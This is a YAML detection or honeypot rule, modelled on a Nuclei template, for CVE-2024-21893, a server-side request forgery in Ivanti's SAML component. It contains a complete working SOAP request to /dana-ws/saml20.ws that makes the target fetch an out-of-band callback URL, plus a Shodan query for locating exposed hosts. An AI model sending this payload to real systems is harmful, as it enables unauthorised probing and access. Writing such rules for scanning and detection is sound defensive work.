rules/nuclei/http/cves/2024/CVE-2024-21893.yaml

id: CVE-2024-21893
info:
  name: Ivanti SAML - Server Side Request Forgery (SSRF)
  author: DhiyaneshDk
  description: 'A server-side request forgery vulnerability in the SAML component
    of Ivanti Connect Secure (9.x, 22.x) and Ivanti Policy Secure (9.x, 22.x) and
    Ivanti Neurons for ZTA allows an attacker to access certain restricted resources
    without authentication.

    '
  severity: high
  reference:
  - https://attackerkb.com/topics/FGlK1TVnB2/cve-2024-21893/rapid7-analysis
  - https://www.assetnote.io/resources/research/ivantis-pulse-connect-secure-auth-bypass-round-two
  - https://github.com/advisories/GHSA-5rr9-mqhj-7cr2
  - https://github.com/Chocapikk/CVE-2024-21893-to-CVE-2024-21887
  - https://github.com/Ostorlab/KEV
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N
    cvss-score: 8.2
    cve-id: CVE-2024-21893
    cwe-id: CWE-918
    epss-score: 0.96249
    epss-percentile: 0.9949
    cpe: cpe:2.3:a:ivanti:connect_secure:9.0:-:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: ivanti
    product: connect_secure
    shodan-query: html:"welcome.cgi?p=logo"
  tags: cve,cve2024,kev,ssrf,ivanti
traps:
- request:
    method: POST
    path: /dana-ws/saml20.ws
    headers: {}
    body: "<?xml version=\"1.0\" encoding=\"UTF-8\"?><soap:Envelope xmlns:soap=\"\
      http://schemas.xmlsoap.org/soap/envelope/\">\t<soap:Body>\t\t<ds:Signature\t\
      \txmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\">\t\t\t<ds:SignedInfo>\t\t\t\
      \t<ds:CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"\
      />\t\t\t\t<ds:SignatureMethod Algorithm=\"http://www.w3.org/2000/09/xmldsig#rsa-sha1\"\
      />\t\t\t</ds:SignedInfo>\t\t\t<ds:SignatureValue>qwerty</ds:SignatureValue>\t\
      \t\t<ds:KeyInfo xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"\
      http://www.w3.org/2000/09/xmldsig\" xmlns:ds=\"http://www.w3.org/2000/09/xmldsig#\"\
      >\t\t\t\t<ds:RetrievalMethod URI=\"http://{{interactsh-url}}\"/>\t\t\t\t<ds:X509Data/>\t\
      \t\t</ds:KeyInfo>\t\t\t<ds:Object></ds:Object>\t\t</ds:Signature>\t</soap:Body></soap:Envelope>\n"
  response:
    status_code: 200
    headers: {}
    body: /dana-na/WriteCSS
